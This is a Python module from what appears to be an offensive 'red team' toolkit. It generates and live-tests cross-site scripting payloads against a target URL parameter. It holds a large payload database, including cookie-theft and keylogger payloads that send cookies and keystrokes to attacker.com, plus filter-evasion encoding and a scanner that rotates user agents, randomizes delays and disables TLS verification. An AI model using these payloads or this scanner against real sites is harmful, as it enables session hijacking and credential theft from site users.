# modules/xss.py
# Advanced XSS payload generator and tester for red team operations

from colorama import Fore, Style
import random
import requests
import urllib.parse
import time
import base64
from typing import List, Dict, Any
from utils.encoders import apply_all_bypasses

# ──────────────────────────────────────────────
# Expanded 2025–2026 XSS payload database
# Focused on reflected, stored, DOM, polyglot, CSP bypass, mutation & event handler chains
# ──────────────────────────────────────────────

XSS_PAYLOADS = {
    "reflected": {
        "classic": [
            "<script>alert(1337)</script>",
            "<img src=x onerror=alert(1337)>",
            "<svg onload=alert(1337)>",
            "<iframe src=javascript:alert(1337)>",
            "<details open ontoggle=alert(1337)>",
            "<audio src onerror=alert(1337)>",
            "<video><source onerror=alert(1337)>",
            "<math><mi xlink:href=\"javascript:alert(1337)\">",
            "<embed src=\"javascript:alert(1337)\">",
            "<object data=\"javascript:alert(1337)\">",
        ],
        "polyglot": [
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1337)//'>",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onclick=alert(1337) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1337)//>\\x3e",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg==",
            "javascript:alert(1337)//\"</script><script>alert(1337)</script>",
            "';alert(1337);//--></script><script>alert(1337)</script>",
        ],
        "attribute_breakout": [
            "\" autofocus onfocus=alert(1337) x=\"",
            "'><script>alert(1337)</script>",
            "\";alert(1337);//",
            "javascript:alert(1337)",
            "`;alert(1337)//",
            " onclick=alert(1337) ",
            " onmouseover=alert(1337) ",
            " onfocus=alert(1337) autofocus ",
        ],
        "event_handlers": [
            " onpointerover=alert(1337)",
            " onmouseenter=alert(1337)",
            " onmouseleave=alert(1337)",
            " ondrag=alert(1337)",
            " ondrop=alert(1337)",
            " oncut=alert(1337)",
            " onpaste=alert(1337)",
            " oncontextmenu=alert(1337)",
            " onauxclick=alert(1337)",
            " onbeforetoggle=alert(1337)",
        ],
        "csp_weak_bypass": [
            "<script src=//evil.js></script>",
            "<img src=//evil.com/xss.png onerror=alert(1337)>",
            "<iframe srcdoc=\"<svg onload=alert(1337)>\"></iframe>",
            "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg==\"></object>",
            "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg==\">",
        ],
    },

    "stored": {
        "cookie_theft": [
            "<script>new Image().src='//attacker.com?c='+encodeURIComponent(document.cookie)</script>",
            "<img src=x onerror=\"fetch('//attacker.com?c='+btoa(document.cookie))\">",
            "<svg onload=\"navigator.sendBeacon('//attacker.com',document.cookie)\">",
            "<script>location='//attacker.com?c='+document.cookie</script>",
            "<iframe src=\"javascript:fetch('//attacker.com?c='+btoa(document.cookie))\"></iframe>",
        ],
        "keylogger": [
            "<script>document.onkeypress=e=>fetch('//attacker.com?k='+encodeURIComponent(e.key))</script>",
            "<input onkeyup=\"fetch('//attacker.com?k='+this.value)\">",
            "<textarea oninput=\"fetch('//attacker.com?k='+this.value)\"></textarea>",
        ],
        "persistent_dom": [
            "<script>localStorage.setItem('x','<img src=x onerror=alert(1337)>');document.body.innerHTML+=localStorage.x</script>",
            "<script>sessionStorage.setItem('x','<svg onload=alert(1337)>');eval(sessionStorage.x)</script>",
        ],
    },

    "dom_based": {
        "sinks": [
            "document.write('<img src=x onerror=alert(1337)>')",
            "document.writeln('<svg onload=alert(1337)>')",
            "eval('al'+'ert(1337)')",
            "setTimeout('alert(1337)',10)",
            "setInterval('alert(1337)',10)",
            "Function('alert(1337)')()",
            "location='javascript:alert(1337)'",
            "innerHTML='<img src=x onerror=alert(1337)>'",
            "outerHTML='<script>alert(1337)</script>'",
        ],
        "angular": [
            "{{constructor.constructor('alert(1337)')()}}",
            "{{$on.constructor('alert(1337)')()}}",
            "{{_c.constructor('alert(1337)')()}}",
        ],
        "vue_react": [
            "<div v-html=\"'<img src=x onerror=alert(1337)>'\"></div>",
            "<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1337)>'}} />",
        ],
    },

    "mutation_dom_clobbering": [
        "<a id=window name=alert href=\"javascript:alert(1337)\">click</a><iframe srcdoc=\"<svg onload=window.alert(1337)>\"></iframe>",
        "<a id=alert href=\"javascript:alert(1337)\">click</a><iframe srcdoc=\"<svg onload=alert(1337)>\"></iframe>",
        "<form name=alert><input name=toString value=alert><input type=submit>",
    ],

    "filter_evasion": [
        "<ScRiPt>alert(1337)</sCrIpT>",
        "<img/src/onerror=alert(1337)>",
        "<svg/onload=alert(1337)>",
        "<details/open/ontoggle=alert(1337)>",
        "<body/onload=alert(1337)>",
        "<marquee onstart=alert(1337)>",
        "<isindex type=image src=1 onerror=alert(1337)>",
        "<table background=\"javascript:alert(1337)\">",
    ]
}


def generate_xss_payloads(
    xss_type: str = "all",
    context: str = "all",
    encode_type: str = None,
    double_encode: bool = False,
    obfuscate: bool = True,
    case_manip: bool = True
) -> List[Dict[str, Any]]:
    """
    Generate a large set of XSS payloads with variants, encoding and obfuscation.
    Returns list of dicts ready for testing or export.
    """
    payloads = []

    types_to_use = [xss_type] if xss_type != "all" else list(XSS_PAYLOADS.keys())

    for t in types_to_use:
        if t not in XSS_PAYLOADS:
            continue

        group = XSS_PAYLOADS[t]

        if isinstance(group, dict):
            # Nested structure (reflected, stored, dom_based, etc)
            contexts = [context] if context != "all" else list(group.keys())
            for ctx in contexts:
                if ctx not in group:
                    continue
                for raw_payload in group[ctx]:
                    variants = [
                        raw_payload,
                        urllib.parse.quote(raw_payload),
                        urllib.parse.quote_plus(raw_payload),
                        raw_payload.replace("1337", f"{random.randint(10000,99999)}"),
                        raw_payload.replace("alert", random.choice(["prompt","confirm","print","console.log"])),
                    ]
                    for variant in variants:
                        processed = apply_all_bypasses(
                            payload=variant,
                            encode_type=encode_type,
                            double_encode=double_encode,
                            obfuscate=obfuscate,
                            case_manip=case_manip,
                            keywords=["alert","prompt","confirm","onerror","onload","onfocus","svg","javascript","fetch","document","cookie","eval","setTimeout"]
                        )
                        payloads.append({
                            "payload": processed,
                            "type": t,
                            "context": ctx,
                            "original": raw_payload,
                            "description": f"XSS | {t.upper()} | {ctx.upper()}"
                        })
        else:
            # Flat list (mutation, filter_evasion, etc)
            for raw_payload in group:
                variants = [
                    raw_payload,
                    urllib.parse.quote(raw_payload),
                    raw_payload.replace("1337", str(random.randint(10000,99999))),
                ]
                for variant in variants:
                    processed = apply_all_bypasses(
                        payload=variant,
                        encode_type=encode_type,
                        double_encode=double_encode,
                        obfuscate=obfuscate,
                        case_manip=case_manip,
                        keywords=["alert","onerror","onload","javascript","svg","iframe"]
                    )
                    payloads.append({
                        "payload": processed,
                        "type": t,
                        "context": "generic",
                        "original": raw_payload,
                        "description": f"XSS | {t.upper()} | GENERIC"
                    })

    random.shuffle(payloads)
    return payloads


def run_live_xss(
    base_url: str,
    param: str,
    payloads: List[Dict[str, Any]],
    delay: float = 1.2,
    timeout: int = 15,
    proxies: Dict = None
) -> List[Dict[str, Any]]:
    """
    Execute live XSS testing with improved detection logic.
    Returns list of findings.
    """
    print(f"\n{Fore.RED}Starting XSS testing → {base_url}?{param}=[PAYLOAD]{Style.RESET_ALL}")
    print(f"Testing {len(payloads)} payloads. Progress shown live.\n")

    session = requests.Session()
    session.headers.update({
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        ])
    })

    if proxies:
        session.proxies = proxies

    findings = []
    total = len(payloads)

    execution_indicators = [
        "alert(", "alert`", "prompt(", "confirm(", "1337", "onerror=", "onload=", "ontoggle=",
        "innerHTML", "outerHTML", "document.write", "eval(", "setTimeout(", "Function("
    ]

    for idx, entry in enumerate(payloads, 1):
        payload = entry["payload"]
        try:
            target_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            start = time.time()
            response = session.get(target_url, timeout=timeout, verify=False)
            elapsed = time.time() - start

            status_str = f"{Fore.GREEN}{response.status_code}{Style.RESET_ALL}" if response.status_code == 200 else \
                         f"{Fore.YELLOW}{response.status_code}{Style.RESET_ALL}"

            reflected = any(ind.lower() in response.text.lower() for ind in execution_indicators)
            hint = f"{Fore.RED}POSSIBLE EXECUTION{Style.RESET_ALL}" if reflected else "No clear execution"

            print(f"  [{idx:3d}/{total:3d}]  {payload[:68]:<68} → Status: {status_str} | {hint} ({elapsed:.2f}s)")

            if reflected:
                print(f"  {Fore.RED}→ Potential XSS confirmed{Style.RESET_ALL}  Type: {entry['type']} | Context: {entry.get('context','')}")
                findings.append({
                    "url": target_url,
                    "payload": payload,
                    "type": entry["type"],
                    "context": entry.get("context", "generic"),
                    "status": "Potential XSS",
                    "status_code": response.status_code,
                    "reason": "Execution indicator found in response",
                    "elapsed": round(elapsed, 2)
                })

            time.sleep(delay + random.uniform(0.3, 2.0))

        except requests.exceptions.RequestException as exc:
            print(f"  [{idx:3d}/{total:3d}]  {payload[:68]:<68} → {Fore.YELLOW}Request failed: {str(exc)[:70]}{Style.RESET_ALL}")

    return findings


def get_payloads_for_export(payloads: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Prepare payload list for export (json/txt/html)."""
    return [{
        "payload": p["payload"],
        "type": p["type"],
        "context": p.get("context", "generic"),
        "description": p.get("description", "XSS payload"),
        "original": p.get("original", "")
    } for p in payloads]


if __name__ == "__main__":
    print("This is a module — use main.py to run it.")